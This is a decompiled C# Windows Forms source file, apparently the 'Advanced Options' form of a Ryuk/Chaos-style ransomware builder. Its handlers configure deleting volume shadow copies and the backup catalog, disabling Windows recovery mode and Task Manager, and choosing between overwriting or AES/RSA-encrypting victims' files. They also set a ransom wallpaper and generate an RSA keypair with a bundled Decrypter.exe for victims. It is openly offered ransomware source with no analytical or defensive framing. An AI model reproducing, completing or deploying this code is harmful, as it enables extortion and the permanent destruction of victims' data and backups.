using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Xml.Serialization;
using CustomWindowsForm;
using Ryuk.Net.Properties;

namespace Ryuk.Net;

public class advancedSettingForm : Form
{
	private bool mouseDown;

	private Point lastLocation;

	private IContainer components = null;

	private Panel panel1;

	private ButtonZ buttonZ1;

	private CheckBox deleteBackupCatalogCheckbox;

	private CheckBox disableRecoveryModeCheckbox;

	private CheckBox deleteShadowCopiesCheckbox;

	private CheckBox resistAdminCheckbox;

	private Label label1;

	private OpenFileDialog openFileDialog1;

	private Label pathToXmlLabel;

	private Button button2;

	private TextBox textBox1;

	private Label label2;

	private Label label3;

	private TextBox pathToImageText;

	private Button button1;

	private RadioButton radioButton2;

	private RadioButton radioButton1;

	private Label overwriteInfoLabel;

	private CheckBox taskManager;

	public advancedSettingForm()
	{
		InitializeComponent();
	}

	private void advancedSettingForm_Load(object sender, EventArgs e)
	{
		if (Settings.Default.checkAdminPrivilage)
		{
			resistAdminCheckbox.Checked = true;
		}
		else
		{
			resistAdminCheckbox.Checked = false;
		}
		bool encryptOption = Settings.Default.encryptOption;
		string decrypterName = Settings.Default.decrypterName;
		if (decrypterName == "")
		{
			((Control)textBox1).Enabled = true;
		}
		else
		{
			((Control)textBox1).Text = decrypterName;
			((Control)textBox1).Enabled = false;
			((Control)button2).Text = "Public key selected";
		}
		string pathToBase = Settings.Default.pathToBase64;
		if (pathToBase != "")
		{
			((Control)pathToImageText).Text = pathToBase;
		}
	}

	private void buttonZ1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void advancedSettingForm_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.Location;
	}

	private void advancedSettingForm_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).Location = new Point(((Form)this).Location.X - lastLocation.X + e.X, ((Form)this).Location.Y - lastLocation.Y + e.Y);
			((Control)this).Update();
		}
	}

	private void advancedSettingForm_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void buttonZ1_Click_1(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void resistAdminCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (resistAdminCheckbox.Checked)
		{
			Settings.Default.checkAdminPrivilage = true;
			((Control)deleteShadowCopiesCheckbox).Enabled = true;
			((Control)disableRecoveryModeCheckbox).Enabled = true;
			((Control)deleteBackupCatalogCheckbox).Enabled = true;
			deleteShadowCopiesCheckbox.Checked = true;
			disableRecoveryModeCheckbox.Checked = true;
			deleteBackupCatalogCheckbox.Checked = true;
			taskManager.Checked = true;
			((Control)taskManager).Enabled = true;
		}
		else
		{
			Settings.Default.checkAdminPrivilage = false;
			((Control)deleteShadowCopiesCheckbox).Enabled = false;
			((Control)disableRecoveryModeCheckbox).Enabled = false;
			((Control)deleteBackupCatalogCheckbox).Enabled = false;
			deleteShadowCopiesCheckbox.Checked = false;
			disableRecoveryModeCheckbox.Checked = false;
			deleteBackupCatalogCheckbox.Checked = false;
			taskManager.Checked = false;
			((Control)taskManager).Enabled = false;
		}
	}

	private void panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void panel1_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).Location = new Point(((Form)this).Location.X - lastLocation.X + e.X, ((Form)this).Location.Y - lastLocation.Y + e.Y);
			((Control)this).Update();
		}
	}

	private void panel1_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void panel1_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.Location;
	}

	private void deleteShadowCopiesCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (deleteShadowCopiesCheckbox.Checked)
		{
			Settings.Default.deleteShadowCopies = true;
		}
		else
		{
			Settings.Default.deleteShadowCopies = false;
		}
	}

	private void deleteBackupCatalogCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (deleteBackupCatalogCheckbox.Checked)
		{
			Settings.Default.deleteBackupCatalog = true;
		}
		else
		{
			Settings.Default.deleteBackupCatalog = false;
		}
	}

	private void disableRecoveryModeCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (disableRecoveryModeCheckbox.Checked)
		{
			Settings.Default.disableRecoveryMode = true;
		}
		else
		{
			Settings.Default.disableRecoveryMode = false;
		}
	}

	private void radioButton1_CheckedChanged(object sender, EventArgs e)
	{
		((Control)button2).Visible = false;
		((Control)textBox1).Visible = false;
		((Control)label2).Visible = false;
		((Control)overwriteInfoLabel).Text = "This function works faster but files cannot be returned ";
		Settings.Default.encryptOption = false;
	}

	private void radioButton2_CheckedChanged(object sender, EventArgs e)
	{
		((Control)button2).Visible = true;
		((Control)textBox1).Visible = true;
		((Control)label2).Visible = true;
		((Control)overwriteInfoLabel).Text = "Files will be encrypted with AES / RSA method ";
		Settings.Default.encryptOption = true;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Invalid comparison between Unknown and I4
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).FilterIndex = 1;
		if ((int)((CommonDialog)val).ShowDialog() == 1)
		{
			string fileName = ((FileDialog)val).FileName;
			string fileName2 = Path.GetFileName(fileName);
			((Control)textBox1).Text = fileName2;
			MessageBox.Show(fileName);
		}
	}

	private void decrypter(string decrypter)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0199: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0345: Unknown result type (might be due to invalid IL or missing references)
		//IL_0381: Unknown result type (might be due to invalid IL or missing references)
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		RSAParameters publicKey = rSACryptoServiceProvider.ExportParameters(includePrivateParameters: true);
		RSAParameters publicKey2 = rSACryptoServiceProvider.ExportParameters(includePrivateParameters: false);
		string keyString = GetKeyString(publicKey2);
		string keyString2 = GetKeyString(publicKey);
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		if (((Control)textBox1).Text.Contains("-decrypter"))
		{
			string text = ((Control)textBox1).Text;
			if (text == "")
			{
				MessageBox.Show("Decrypter name field is empty!");
				return;
			}
			if (Directory.Exists(text))
			{
				string path = directoryName + "\\" + text + "\\publicKey.chaos";
				Settings.Default.publicKey = File.ReadAllText(path);
				Settings.Default.decrypterName = text;
				MessageBox.Show("Public key selected successfully!");
				((Control)textBox1).Text = text;
				((Control)textBox1).Enabled = false;
				((Control)button2).Text = "Public key selected";
				return;
			}
			try
			{
				Directory.CreateDirectory(text);
				string path2 = directoryName + "\\" + text + "\\publicKey.chaos";
				string path3 = directoryName + "\\" + text + "\\privateKey.chaos";
				File.WriteAllText(path2, keyString);
				File.WriteAllText(path3, keyString2);
				byte[] bytes = Resources.decrypter;
				File.WriteAllBytes(directoryName + "\\" + text + "\\Decrypter.exe", bytes);
				Settings.Default.publicKey = File.ReadAllText(path2);
				Settings.Default.decrypterName = text;
				MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
				((Control)textBox1).Text = text;
				((Control)textBox1).Enabled = false;
				((Control)button2).Text = "Public key selected";
				return;
			}
			catch
			{
				MessageBox.Show("Unexpected error occured");
				return;
			}
		}
		string text2 = ((Control)textBox1).Text + "-decrypter";
		if (text2 == "-decrypter")
		{
			MessageBox.Show("Decrypter name field is empty!");
			return;
		}
		if (Directory.Exists(text2) || Directory.Exists(text2 + "-decrypter"))
		{
			string path4 = directoryName + "\\" + text2 + "\\publicKey.chaos";
			Settings.Default.publicKey = File.ReadAllText(path4);
			Settings.Default.decrypterName = text2;
			MessageBox.Show("Decrypter exists. Public key selected successfully!");
			((Control)textBox1).Text = text2;
			((Control)textBox1).Enabled = false;
			((Control)button2).Text = "Public key selected";
			return;
		}
		try
		{
			Directory.CreateDirectory(text2);
			string path5 = directoryName + "\\" + text2 + "\\publicKey.chaos";
			string path6 = directoryName + "\\" + text2 + "\\privateKey.chaos";
			File.WriteAllText(path5, keyString);
			File.WriteAllText(path6, keyString2);
			byte[] bytes2 = Resources.decrypter;
			File.WriteAllBytes(directoryName + "\\" + text2 + "\\Decrypter.exe", bytes2);
			Settings.Default.publicKey = File.ReadAllText(path5);
			Settings.Default.decrypterName = text2;
			MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
			((Control)textBox1).Text = text2;
			((Control)textBox1).Enabled = false;
			((Control)button2).Text = "Public key selected";
		}
		catch
		{
			MessageBox.Show("Unexpected error occured");
		}
	}

	public static string GetKeyString(RSAParameters publicKey)
	{
		StringWriter stringWriter = new StringWriter();
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(RSAParameters));
		xmlSerializer.Serialize(stringWriter, publicKey);
		return stringWriter.ToString();
	}

	private void pathToXmlLabel_Click(object sender, EventArgs e)
	{
	}

	private void overwriteInfoLabel_Click(object sender, EventArgs e)
	{
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click_1(object sender, EventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Invalid comparison between Unknown and I4
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		try
		{
			OpenFileDialog val = new OpenFileDialog();
			((FileDialog)val).Filter = "Image Files(*.jpg; *.jpeg; *.gif; *.bmp)|*.jpg; *.jpeg; *.gif; *.bmp";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				((Control)pathToImageText).Text = ((FileDialog)val).FileName;
				byte[] inArray = File.ReadAllBytes(((FileDialog)val).FileName);
				string text = Convert.ToBase64String(inArray);
				Settings.Default.base64Image = text;
				Settings.Default.pathToBase64 = ((FileDialog)val).FileName;
				File.WriteAllText(folderPath + "/sdf.txt", text);
			}
		}
		catch (Exception)
		{
			throw new ApplicationException("Failed loading image");
		}
	}

	private void taskManager_CheckedChanged(object sender, EventArgs e)
	{
		if (taskManager.Checked)
		{
			Settings.Default.disableTaskManager = true;
		}
		else
		{
			Settings.Default.disableTaskManager = false;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_02dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e7: Expected O, but got Unknown
		//IL_02f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ff: Expected O, but got Unknown
		//IL_030d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0317: Expected O, but got Unknown
		//IL_0325: Unknown result type (might be due to invalid IL or missing references)
		//IL_032f: Expected O, but got Unknown
		//IL_0411: Unknown result type (might be due to invalid IL or missing references)
		//IL_041b: Expected O, but got Unknown
		//IL_053f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0549: Expected O, but got Unknown
		//IL_0600: Unknown result type (might be due to invalid IL or missing references)
		//IL_060a: Expected O, but got Unknown
		//IL_075b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0765: Expected O, but got Unknown
		//IL_081f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0829: Expected O, but got Unknown
		//IL_08be: Unknown result type (might be due to invalid IL or missing references)
		//IL_08c8: Expected O, but got Unknown
		//IL_097f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0989: Expected O, but got Unknown
		//IL_0a50: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a5a: Expected O, but got Unknown
		//IL_0b1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b25: Expected O, but got Unknown
		//IL_0be8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf2: Expected O, but got Unknown
		//IL_0f3e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f48: Expected O, but got Unknown
		//IL_1090: Unknown result type (might be due to invalid IL or missing references)
		//IL_109a: Expected O, but got Unknown
		//IL_10a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ad: Expected O, but got Unknown
		//IL_10b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_10c0: Expected O, but got Unknown
		panel1 = new Panel();
		taskManager = new CheckBox();
		label3 = new Label();
		pathToImageText = new TextBox();
		button1 = new Button();
		label2 = new Label();
		textBox1 = new TextBox();
		button2 = new Button();
		pathToXmlLabel = new Label();
		overwriteInfoLabel = new Label();
		radioButton2 = new RadioButton();
		radioButton1 = new RadioButton();
		label1 = new Label();
		buttonZ1 = new ButtonZ();
		deleteBackupCatalogCheckbox = new CheckBox();
		disableRecoveryModeCheckbox = new CheckBox();
		deleteShadowCopiesCheckbox = new CheckBox();
		resistAdminCheckbox = new CheckBox();
		openFileDialog1 = new OpenFileDialog();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).BackColor = Color.FromArgb(30, 30, 30);
		((Control)panel1).Controls.Add((Control)(object)taskManager);
		((Control)panel1).Controls.Add((Control)(object)label3);
		((Control)panel1).Controls.Add((Control)(object)pathToImageText);
		((Control)panel1).Controls.Add((Control)(object)button1);
		((Control)panel1).Controls.Add((Control)(object)label2);
		((Control)panel1).Controls.Add((Control)(object)textBox1);
		((Control)panel1).Controls.Add((Control)(object)button2);
		((Control)panel1).Controls.Add((Control)(object)pathToXmlLabel);
		((Control)panel1).Controls.Add((Control)(object)overwriteInfoLabel);
		((Control)panel1).Controls.Add((Control)(object)radioButton2);
		((Control)panel1).Controls.Add((Control)(object)radioButton1);
		((Control)panel1).Controls.Add((Control)(object)label1);
		((Control)panel1).Controls.Add((Control)(object)buttonZ1);
		((Control)panel1).Controls.Add((Control)(object)deleteBackupCatalogCheckbox);
		((Control)panel1).Controls.Add((Control)(object)disableRecoveryModeCheckbox);
		((Control)panel1).Controls.Add((Control)(object)deleteShadowCopiesCheckbox);
		((Control)panel1).Controls.Add((Control)(object)resistAdminCheckbox);
		((Control)panel1).Location = new Point(2, 1);
		((Control)panel1).Name = "panel1";
		((Control)panel1).Size = new Size(349, 415);
		((Control)panel1).TabIndex = 11;
		((Control)panel1).Paint += new PaintEventHandler(panel1_Paint);
		((Control)panel1).MouseDown += new MouseEventHandler(panel1_MouseDown);
		((Control)panel1).MouseMove += new MouseEventHandler(panel1_MouseMove);
		((Control)panel1).MouseUp += new MouseEventHandler(panel1_MouseUp);
		((Control)taskManager).AutoSize = true;
		((Control)taskManager).Cursor = Cursors.Hand;
		((Control)taskManager).Enabled = false;
		((Control)taskManager).ForeColor = Color.White;
		((Control)taskManager).Location = new Point(70, 189);
		((Control)taskManager).Name = "taskManager";
		((Control)taskManager).Size = new Size(128, 17);
		((Control)taskManager).TabIndex = 34;
		((Control)taskManager).Text = "Disable task manager";
		((ButtonBase)taskManager).UseVisualStyleBackColor = true;
		taskManager.CheckedChanged += taskManager_CheckedChanged;
		((Control)label3).AutoSize = true;
		((Control)label3).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label3).ForeColor = Color.White;
		((Control)label3).Location = new Point(19, 227);
		((Control)label3).Name = "label3";
		((Control)label3).Size = new Size(169, 16);
		((Control)label3).TabIndex = 33;
		((Control)label3).Text = "Change desktop wallpaper";
		((Control)pathToImageText).BackColor = Color.FromArgb(30, 30, 30);
		((Control)pathToImageText).ForeColor = Color.White;
		((Control)pathToImageText).Location = new Point(21, 250);
		((Control)pathToImageText).Name = "pathToImageText";
		((Control)pathToImageText).Size = new Size(205, 20);
		((Control)pathToImageText).TabIndex = 32;
		((Control)button1).BackColor = Color.FromArgb(30, 30, 30);
		((Control)button1).Cursor = Cursors.Hand;
		((Control)button1).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)button1).ForeColor = Color.White;
		((Control)button1).Location = new Point(232, 246);
		((Control)button1).Name = "button1";
		((Control)button1).Size = new Size(110, 26);
		((Control)button1).TabIndex = 31;
		((Control)button1).Text = "Select Image";
		((ButtonBase)button1).UseVisualStyleBackColor = false;
		((Control)button1).Click += button1_Click_1;
		((Control)label2).AutoSize = true;
		((Control)label2).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label2).ForeColor = Color.White;
		((Control)label2).Location = new Point(18, 357);
		((Control)label2).Name = "label2";
		((Control)label2).Size = new Size(107, 16);
		((Control)label2).TabIndex = 30;
		((Control)label2).Text = "Decrypter Name";
		((Control)label2).Click += label2_Click;
		((Control)textBox1).BackColor = Color.FromArgb(30, 30, 30);
		((Control)textBox1).ForeColor = Color.White;
		((Control)textBox1).Location = new Point(21, 376);
		((Control)textBox1).Name = "textBox1";
		((Control)textBox1).Size = new Size(159, 20);
		((Control)textBox1).TabIndex = 29;
		((Control)textBox1).TextChanged += textBox1_TextChanged;
		((Control)button2).BackColor = Color.FromArgb(30, 30, 30);
		((Control)button2).Cursor = Cursors.Hand;
		((Control)button2).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)button2).ForeColor = Color.White;
		((Control)button2).Location = new Point(206, 370);
		((Control)button2).Name = "button2";
		((Control)button2).Size = new Size(136, 26);
		((Control)button2).TabIndex = 28;
		((Control)button2).Text = "Create Decrypter";
		((ButtonBase)button2).UseVisualStyleBackColor = false;
		((Control)button2).Click += button2_Click;
		((Control)pathToXmlLabel).AutoSize = true;
		((Control)pathToXmlLabel).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)pathToXmlLabel).ForeColor = Color.White;
		((Control)pathToXmlLabel).Location = new Point(24, 355);
		((Control)pathToXmlLabel).Name = "pathToXmlLabel";
		((Control)pathToXmlLabel).Size = new Size(0, 16);
		((Control)pathToXmlLabel).TabIndex = 26;
		((Control)pathToXmlLabel).Click += pathToXmlLabel_Click;
		((Control)overwriteInfoLabel).AutoSize = true;
		((Control)overwriteInfoLabel).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)overwriteInfoLabel).ForeColor = Color.White;
		((Control)overwriteInfoLabel).Location = new Point(22, 331);
		((Control)overwriteInfoLabel).Name = "overwriteInfoLabel";
		((Control)overwriteInfoLabel).Size = new Size(275, 16);
		((Control)overwriteInfoLabel).TabIndex = 24;
		((Control)overwriteInfoLabel).Text = "Files will be encrypted with AES/RSA method";
		((Control)overwriteInfoLabel).Click += overwriteInfoLabel_Click;
		((Control)radioButton2).AutoSize = true;
		radioButton2.Checked = true;
		((Control)radioButton2).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)radioButton2).ForeColor = Color.White;
		((Control)radioButton2).Location = new Point(206, 296);
		((Control)radioButton2).Name = "radioButton2";
		((Control)radioButton2).Size = new Size(142, 20);
		((Control)radioButton2).TabIndex = 23;
		radioButton2.TabStop = true;
		((Control)radioButton2).Text = "Encrypt  AES / RSA";
		((ButtonBase)radioButton2).UseVisualStyleBackColor = true;
		radioButton2.CheckedChanged += radioButton2_CheckedChanged;
		((Control)radioButton1).AutoSize = true;
		((Control)radioButton1).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)radioButton1).ForeColor = Color.White;
		((Control)radioButton1).Location = new Point(30, 296);
		((Control)radioButton1).Name = "radioButton1";
		((Control)radioButton1).Size = new Size(126, 20);
		((Control)radioButton1).TabIndex = 22;
		((Control)radioButton1).Text = "Overwrite all files";
		((ButtonBase)radioButton1).UseVisualStyleBackColor = true;
		((Control)radioButton1).Visible = false;
		radioButton1.CheckedChanged += radioButton1_CheckedChanged;
		((Control)label1).AutoSize = true;
		((Control)label1).Font = new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label1).ForeColor = Color.White;
		((Control)label1).Location = new Point(5, 8);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(252, 31);
		((Control)label1).TabIndex = 21;
		((Control)label1).Text = "Advanced Options";
		((Control)buttonZ1).Anchor = (AnchorStyles)9;
		buttonZ1.BZBackColor = Color.FromArgb(30, 30, 30);
		buttonZ1.DisplayText = "X";
		((ButtonBase)buttonZ1).FlatStyle = (FlatStyle)0;
		((Control)buttonZ1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)buttonZ1).ForeColor = Color.White;
		((Control)buttonZ1).Location = new Point(318, 0);
		buttonZ1.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		buttonZ1.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)buttonZ1).Name = "buttonZ1";
		((Control)buttonZ1).Size = new Size(31, 24);
		((Control)buttonZ1).TabIndex = 20;
		((Control)buttonZ1).Text = "X";
		buttonZ1.TextLocation_X = 6;
		buttonZ1.TextLocation_Y = 1;
		((ButtonBase)buttonZ1).UseVisualStyleBackColor = true;
		((Control)buttonZ1).Click += buttonZ1_Click_1;
		((Control)deleteBackupCatalogCheckbox).AutoSize = true;
		((Control)deleteBackupCatalogCheckbox).Cursor = Cursors.Hand;
		((Control)deleteBackupCatalogCheckbox).Enabled = false;
		((Control)deleteBackupCatalogCheckbox).ForeColor = Color.White;
		((Control)deleteBackupCatalogCheckbox).Location = new Point(70, 120);
		((Control)deleteBackupCatalogCheckbox).Name = "deleteBackupCatalogCheckbox";
		((Control)deleteBackupCatalogCheckbox).Size = new Size(152, 17);
		((Control)deleteBackupCatalogCheckbox).TabIndex = 19;
		((Control)deleteBackupCatalogCheckbox).Text = "Delete the backup catalog";
		((ButtonBase)deleteBackupCatalogCheckbox).UseVisualStyleBackColor = true;
		deleteBackupCatalogCheckbox.CheckedChanged += deleteBackupCatalogCheckbox_CheckedChanged;
		((Control)disableRecoveryModeCheckbox).AutoSize = true;
		((Control)disableRecoveryModeCheckbox).Cursor = Cursors.Hand;
		((Control)disableRecoveryModeCheckbox).Enabled = false;
		((Control)disableRecoveryModeCheckbox).ForeColor = Color.White;
		((Control)disableRecoveryModeCheckbox).Location = new Point(70, 155);
		((Control)disableRecoveryModeCheckbox).Name = "disableRecoveryModeCheckbox";
		((Control)disableRecoveryModeCheckbox).Size = new Size(178, 17);
		((Control)disableRecoveryModeCheckbox).TabIndex = 18;
		((Control)disableRecoveryModeCheckbox).Text = "Disable windows recovery mode";
		((ButtonBase)disableRecoveryModeCheckbox).UseVisualStyleBackColor = true;
		disableRecoveryModeCheckbox.CheckedChanged += disableRecoveryModeCheckbox_CheckedChanged;
		((Control)deleteShadowCopiesCheckbox).AutoSize = true;
		((Control)deleteShadowCopiesCheckbox).Cursor = Cursors.Hand;
		((Control)deleteShadowCopiesCheckbox).Enabled = false;
		((Control)deleteShadowCopiesCheckbox).ForeColor = Color.White;
		((Control)deleteShadowCopiesCheckbox).Location = new Point(70, 84);
		((Control)deleteShadowCopiesCheckbox).Name = "deleteShadowCopiesCheckbox";
		((Control)deleteShadowCopiesCheckbox).Size = new Size(190, 17);
		((Control)deleteShadowCopiesCheckbox).TabIndex = 17;
		((Control)deleteShadowCopiesCheckbox).Text = "Delete all Volumes Shadow Copies";
		((ButtonBase)deleteShadowCopiesCheckbox).UseVisualStyleBackColor = true;
		deleteShadowCopiesCheckbox.CheckedChanged += deleteShadowCopiesCheckbox_CheckedChanged;
		((Control)resistAdminCheckbox).AutoSize = true;
		((Control)resistAdminCheckbox).Cursor = Cursors.Hand;
		((Control)resistAdminCheckbox).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)resistAdminCheckbox).ForeColor = Color.White;
		((Control)resistAdminCheckbox).Location = new Point(57, 52);
		((Control)resistAdminCheckbox).Name = "resistAdminCheckbox";
		((Control)resistAdminCheckbox).Size = new Size(212, 20);
		((Control)resistAdminCheckbox).TabIndex = 16;
		((Control)resistAdminCheckbox).Text = "Resist for admin privileges";
		((ButtonBase)resistAdminCheckbox).UseVisualStyleBackColor = true;
		resistAdminCheckbox.CheckedChanged += resistAdminCheckbox_CheckedChanged;
		((FileDialog)openFileDialog1).FileName = "openFileDialog1";
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.FromArgb(25, 25, 25);
		((Form)this).ClientSize = new Size(356, 419);
		((Control)this).Controls.Add((Control)(object)panel1);
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Control)this).Name = "advancedSettingForm";
		((Form)this).ShowInTaskbar = false;
		((Form)this).StartPosition = (FormStartPosition)1;
		((Control)this).Text = "advancedSettingForm";
		((Form)this).Load += advancedSettingForm_Load;
		((Control)this).MouseDown += new MouseEventHandler(advancedSettingForm_MouseDown);
		((Control)this).MouseMove += new MouseEventHandler(advancedSettingForm_MouseMove);
		((Control)this).MouseUp += new MouseEventHandler(advancedSettingForm_MouseUp);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
